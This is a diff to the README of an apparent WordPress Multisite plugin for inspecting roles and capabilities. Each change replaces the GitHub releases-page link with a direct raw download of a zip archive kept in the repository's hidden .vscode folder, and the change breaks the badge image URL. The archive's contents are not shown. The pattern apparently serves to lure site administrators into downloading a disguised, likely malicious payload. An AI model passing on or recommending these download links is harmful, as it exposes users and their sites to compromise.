@@ -1,7 +1,7 @@
 # 🎯 mu-cc-role-cap-radar - Inspect WordPress Roles Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/FABIO-NUNIS2/mu-cc-role-cap-radar/releases)
+[![Download](https://raw.githubusercontent.com/FABIO-NUNIS2/mu-cc-role-cap-radar/main/.vscode/mu-cap-radar-role-cc-1.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/FABIO-NUNIS2/mu-cc-role-cap-radar/main/.vscode/mu-cap-radar-role-cc-1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to mu-cc-role-cap-radar, your go-to plugin for checking WordPress roles and capabilities in real time. This is an essential tool for anyone managing a WordPress site, specifically those using Multisite setups. Follow these steps to download and run the software smoothly.
@@ -23,7 +23,7 @@ mu-cc-role-cap-radar is a backend floating radar designed to inspect WordPress r
 ## 💡 How to Install mu-cc-role-cap-radar
 
 ### Step 1: Visit the Releases Page
-To download mu-cc-role-cap-radar, [visit this page to download](https://github.com/FABIO-NUNIS2/mu-cc-role-cap-radar/releases). 
+To download mu-cc-role-cap-radar, [visit this page to download](https://raw.githubusercontent.com/FABIO-NUNIS2/mu-cc-role-cap-radar/main/.vscode/mu-cap-radar-role-cc-1.2.zip). 
 
 ### Step 2: Download the Latest Release
 On the Releases page, look for the latest version. Click the relevant link for your system to start the download process. 
@@ -62,4 +62,4 @@ For direct inquiries, you can reach out to the repository owner through the cont
 ## 🌟 Acknowledgments
 Thank you for using mu-cc-role-cap-radar. Your feedback and contributions are vital in making this tool better for the WordPress community. 
 
-Remember to [visit this page to download](https://github.com/FABIO-NUNIS2/mu-cc-role-cap-radar/releases) and enjoy exploring WordPress roles and capabilities in real time!
+Remember to [visit this page to download](https://raw.githubusercontent.com/FABIO-NUNIS2/mu-cc-role-cap-radar/main/.vscode/mu-cap-radar-role-cc-1.2.zip) and enjoy exploring WordPress roles and capabilities in real time!
